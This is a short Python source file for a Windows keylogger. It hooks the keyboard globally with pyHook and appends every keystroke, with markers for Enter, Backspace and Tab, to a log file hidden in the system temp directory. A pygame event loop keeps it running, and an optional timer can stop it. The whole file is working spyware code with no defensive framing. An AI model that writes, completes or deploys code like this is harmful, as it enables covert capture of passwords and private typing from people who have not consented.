import pyHook
import pygame
import general
from threading import Timer
import tempfile


running = True
log_dir = tempfile.gettempdir() + '\\oye_log.txt'


def main():
    start_keylog()


def write_log_file():
    general.write_file(log_dir, '')


def on_keyboard_event(event):
    if event.Ascii == 13:
        general.append_to_file(log_dir, '<ENTER>')
        return True
    elif event.Ascii == 8:
        general.append_to_file(log_dir, '<BACKSPACE>')
        return True
    elif event.Ascii == 9:
        general.append_to_file(log_dir, '<TAB>')
        return True
    else:
        general.append_to_file(log_dir, chr(event.Ascii))
        return True


def hook_keyboard():
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()


def pump_events():
    pygame.init()
    while running:
        pygame.event.pump()


def start_keylog():
    write_log_file()
    hook_keyboard()
    pump_events()


def stop_keylog():
    global running
    running = False


def start_timed_keylog(duration):
    t = Timer(duration, stop_keylog)
    t.start()
    start_keylog()


if __name__ == '__main__':
    main()
